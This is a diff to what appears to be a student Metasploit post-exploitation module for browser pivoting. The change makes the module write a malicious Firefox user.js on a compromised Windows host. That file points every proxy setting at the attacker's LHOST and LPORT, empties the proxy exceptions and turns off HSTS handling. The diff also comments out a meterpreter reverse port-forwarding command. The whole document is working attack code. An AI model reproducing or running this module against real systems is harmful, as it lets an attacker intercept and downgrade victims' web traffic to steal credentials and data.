@@ -32,7 +32,31 @@ class MetasploitModule < Msf::Post
     def upload(directory)
         # Attempt to write the user.js file
         print_status("Uploading a malicious preference file at #{directory}")
-        res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", '/root/itp325/browser-pivot/user.js')
+        host = datastore['LHOST']
+        port = datastore['LPORT']
+        payload = "// modify proxy settings to connect to localhost:8080
+user_pref(\"network.proxy.backup.ftp\", \"#{host}\");
+user_pref(\"network.proxy.backup.ftp_port\", #{port});
+user_pref(\"network.proxy.backup.socks\", \"#{host}\");
+user_pref(\"network.proxy.backup.socks_port\", #{port});
+user_pref(\"network.proxy.backup.ssl\", \"#{host}\");
+user_pref(\"network.proxy.backup.ssl_port\", #{port});
+user_pref(\"network.proxy.ftp\", \"#{host}\");
+user_pref(\"network.proxy.ftp_port\", #{port});
+user_pref(\"network.proxy.http\", \"#{host}\");
+user_pref(\"network.proxy.http_port\", #{port});
+user_pref(\"network.proxy.no_proxies_on\", \"\");
+user_pref(\"network.proxy.share_proxy_settings\", true);
+user_pref(\"network.proxy.socks\", \"#{host}\");
+user_pref(\"network.proxy.socks_port\", #{port});
+user_pref(\"network.proxy.ssl\", \"#{host}\");
+user_pref(\"network.proxy.ssl_port\", #{port});
+user_pref(\"network.proxy.type\", 1)
+// Modify HSTS settings
+user_pref(\"security.mixed_content.send_hsts_priming\", false);
+user_pref(\"security.mixed_content.use_hsts\", false);"
+        #print_status(payload)
+        res = write_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", payload)
         if res.nil?
             print_error "Upload failed"
         else
@@ -101,10 +125,8 @@ class MetasploitModule < Msf::Post
         end
 
         # Attempt to open port forwarding
-        host = datastore['LHOST']
-        port = datastore['LPORT']
-        print_status("Starting reverse port forwarding")
-        session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")
+        # print_status("Starting reverse port forwarding")
+        # session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")
 
     end
 
